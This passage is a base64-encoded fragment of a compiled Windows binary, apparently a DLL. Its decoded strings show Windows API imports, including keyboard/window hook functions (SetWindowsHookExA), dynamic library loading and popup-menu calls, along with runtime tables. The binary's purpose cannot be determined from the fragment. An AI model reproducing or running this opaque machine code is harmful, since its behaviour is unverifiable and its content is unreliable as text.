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AAAAPZYAQAAAAAA5lgBAAAAAADcWAEAAAAAAM5YAQAAAAAAvFgBAAAAAAAAAAAAAAAAAA8CR2V0Q3VycmVudFByb2Nlc3MApAJHZXRQcm9jQWRkcmVzcwAAqANMb2FkTGlicmFyeUEAALEDTG9jYWxBbGxvYwAA/ANPdXRwdXREZWJ1Z1N0cmluZ0EAABQCR2V0Q3VycmVudFRocmVhZElkAAAQAkdldEN1cnJlbnRQcm9jZXNzSWQAS0VSTkVMMzIuZGxsAACLAlJlZ2lzdGVyQ2xhc3NBAACrAERlc3Ryb3lNZW51AOgARW5kTWVudQBzAlBvc3RNZXNzYWdlQQAAEwNTZXRXaW5kb3dMb25nUHRyQQBuAENyZWF0ZVBvcHVwTWVudQAfA1NldFdpbmRvd3NIb29rRXhBAKAARGVmV2luZG93UHJvY0EAAHAAQ3JlYXRlV2luZG93RXhBAEoDVW5ob29rV2luZG93c0hvb2sAHABDYWxsTmV4dEhvb2tFeAAAQQNUcmFja1BvcHVwTWVudQAA7QFJbnNlcnRNZW51SXRlbUEAVVNFUjMyLmRsbAAAzgFHZXRDb21tYW5kTGluZUEAagNJc0RlYnVnZ2VyUHJlc2VudABwA0lzUHJvY2Vzc29yRmVhdHVyZVByZXNlbnQAJQFFbmNvZGVQb2ludGVyAP8ARGVjb2RlUG9pbnRlcgApAUVudGVyQ3JpdGljYWxTZWN0aW9uAAClA0xlYXZlQ3JpdGljYWxTZWN0aW9uAAC7BFJ0bFVud2luZEV4AFYCR2V0TGFzdEVycm9yAAAZBVNldExhc3RFcnJvcgAAVwFFeGl0UHJvY2VzcwBsAkdldE1vZHVsZUhhbmRsZUV4VwAA1ANNdWx0aUJ5dGVUb1dpZGVDaGFyAN0FV2lkZUNoYXJUb011bHRpQnl0ZQCpAkdldFByb2Nlc3NIZWFwAADHAkdldFN0ZEhhbmRsZQAARQJHZXRGaWxlVHlwZQAGAURlbGV0ZUNyaXRpY2FsU2VjdGlvbgDFAkdldFN0YXJ0dXBJbmZvVwBoAkdldE1vZHVsZUZpbGVOYW1lQQAA8QVXcml0ZUZpbGUAaQJHZXRNb2R1bGVGaWxlTmFtZVcAADAEUXVlcnlQZXJmb3JtYW5jZUNvdW50ZXIA3QJHZXRTeXN0ZW1UaW1lQXNGaWxlVGltZQAuAkdldEVudmlyb25tZW50U3RyaW5nc1cAAKMBRnJlZUVudmlyb25tZW50U3RyaW5nc1cArgRSdGxDYXB0dXJlQ29udGV4dAC1BFJ0bExvb2t1cEZ1bmN0aW9uRW50cnkAALwEUnRsVmlydHVhbFVud2luZAAAkgVVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIAAFIFU2V0VW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAFEDSW5pdGlhbGl6ZUNyaXRpY2FsU2VjdGlvbkFuZFNwaW5Db3VudABhBVNsZWVwAHAFVGVybWluYXRlUHJvY2VzcwAAggVUbHNBbGxvYwAAhAVUbHNHZXRWYWx1ZQCFBVRsc1NldFZhbHVlAIMFVGxzRnJlZQBtAkdldE1vZHVsZUhhbmRsZVcAAOIBR2V0Q29uc29sZUNQAAD0AUdldENvbnNvbGVNb2RlAAAMBVNldEZpbGVQb2ludGVyRXgAAHUDSXNWYWxpZENvZGVQYWdlAKoBR2V0QUNQAACNAkdldE9FTUNQAAC5AUdldENQSW5mbwA8A0hlYXBGcmVlAACqA0xvYWRMaWJyYXJ5RXhXAAD9A091dHB1dERlYnVnU3RyaW5nVwAAMAVTZXRTdGRIYW5kbGUAAPAFV3JpdGVDb25zb2xlVwDMAkdldFN0cmluZ1R5cGVXAAA4A0hlYXBBbGxvYwA/A0hlYXBSZUFsbG9jAJgBRmx1c2hGaWxlQnVmZmVycwAAQQNIZWFwU2l6ZQAAmQNMQ01hcFN0cmluZ1cAAMIAQ3JlYXRlRmlsZVcAfwBDbG9zZUhhbmRsZQAAAAAAAAAAAAAAAAAAAAAAMqLfLZkrAADNXSDSZtT//wEAAAACAAAAWPMAQAEAAABg8wBAAQAAAAAAAAAAAAAAAQAAABYAAAACAAAAAgAAAAMAAAACAAAABAAAABgAAAAFAAAADQAAAAYAAAAJAAAABwAAAAwAAAAIAAAADAAAAAkAAAAMAAAACgAAAAcAAAALAAAACAAAAAwAAAAWAAAADQAAABYAAAAPAAAAAgAAABAAAAANAAAAEQAAABIAAAASAAAAAgAAACEAAAANAAAANQAAAAIAAABBAAAADQAAAEMAAAACAAAAUAAAABEAAABSAAAADQAAAFMAAAANAAAAVwAAABYAAABZAAAACwAAAGwAAAANAAAAbQAAACAAAABwAAAAHAAAAHIAAAAJAAAABgAAABYAAACAAAAACgAAAIEAAAAKAAAAggAAAAkAAACDAAAAFgAAAIQAAAANAAAAkQAAACkAAACeAAAADQAAAKEAAAACAAAApAAAAAsAAACnAAAADQAAALcAAAARAAAAzgAAAAIAAADXAAAACwAAABgHAAAMAAAADAAAAAgAAADgiQFAAQAAAAAAAAAAAAAA4IkBQAEAAAABAQAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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QAAACBrAUABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/v///wAAAAD0nABAAQAAAPScAEABAAAA9JwAQAEAAAD0nABAAQAAAPScAEABAAAA9JwAQAEAAAD0nABAAQAAAPScAEABAAAA9JwAQAEAAAD0nABAAQAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHhyAUABAAAAIIgBQAEAAAAgiAFAAQAAACCIAUABAAAAIIgBQAEAAAAgiAFAAQAAACCIAUABAAAAIIgBQAEAAAAgiAFAAQAAACCIAUABAAAAf39/f39/f398cgFAAQAAACSIAUABAAAAJIgBQAEAAAAkiAFAAQAAACSIAUABAAAAJIgBQAEAAAAkiAFAAQAAACSIAUABAAAALgAAAC4AAADgcQFAAQAAAHAJAUABAAAAc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EsBAExXAAD4VwAAPE8BAPhXAAAwWAAARFEBADBYAABoWAAARFEBAGhYAABcWQAASE8BAGRZAADRWQAAYE8BANRZAABFWgAAbE8BALhaAADjWgAAqEsBAORaAAAwWwAAvE0BADBbAAAqXwAAvE0BADxfAABbXwAAvE0BAFxfAAB8XwAAvE0BAHxfAACZXwAAqEsBAJxfAAD/XwAAvE0BAABgAAAmYAAAqEsBAChgAACHYAAAqEsBAIhgAABpYQAAeE8BAGxhAABdaQAApE8BAGBpAABFagAAyE8BAEhqAADbagAAsEsBANxqAAAvawAAvE0BALxrAABSbQAAwEsBAPhtAABtbgAA9E8BAHBuAADSbgAARFEBANRuAAD8bgAAqEsBAPxuAAB5bwAAZFQBAHxvAAAKcAAAwEsBAAxwAADtcQAAiFABAPBxAACqcgAAFFABAKxyAADwdAAAOFABAPB0AACedwAAaFABAKB3AADjdwAAZFQBAOR3AAApeAAAZFQBAEB4AADoeAAAqFABAOh4AAByegAArFABAHR6AACIegAALE0BAIh6AADFegAAvFABAMh6AABHewAAxFABAEh7AADCewAAxFABAMR7AABFfAAAxFABAEh8AACBfAAARFEBAIR8AAAsfQAA3FABACx9AAB4fQAAvE0BAHh9AADxfQAAsEsBAAB+AADmfgAABFEBAOh+AAAsfwAARFEBACx/AACzfwAAwEsBALR/AABxgAAAUFEBAHSAAADVgAAAsEsBAACBAAAkgQAAeFEBADCBAABIgQAAgFEBAFCBAABRgQAAhFEBAGCBAABhgQAAiFEBAMCBAAANggAAjFEBAECCAABfggAAsFEBAGCCAAB9ggAAqEsBAICCAADDggAAvE0BAMSCAADOgwAA0FEBANCDAADngwAAqEsBAOiDAAAbhAAAvE0BAFyEAACPhgAAAFIBAJiGAAARhwAAMFIBACiHAACJhwAAvE0BAIyHAAARiAAAvE0BABSIAAB/iAAAvE0BAJyIAABoiQAAvE0BAGiJAADbiwAAQFIBANyLAAB0jAAAXFIBAHSMAAAejQAAxE0BACCNAACUjQAAqEsBAMCNAAARjwAAkFIBAByPAAB1jwAAEE0BAJCPAADejwAAqFIBAOCPAADqkAAAsFIBAOyQAABYkQAAvFABAFiRAABSlQAAsFIBAFSVAABAmAAAyFIBAECYAADWmAAAuFIBANiYAABOmgAAAFMBAFCaAADMmgAA8FIBAMyaAACCmwAAsEsBAISbAABXnAAAsEsBAFicAADynAAARFEBAACdAADbnQAAKFMBANydAAAjngAAOFMBACSeAACengAARFEBAKCeAAAGnwAAWFMBAAifAADfnwAAfFMBAOCfAAA1o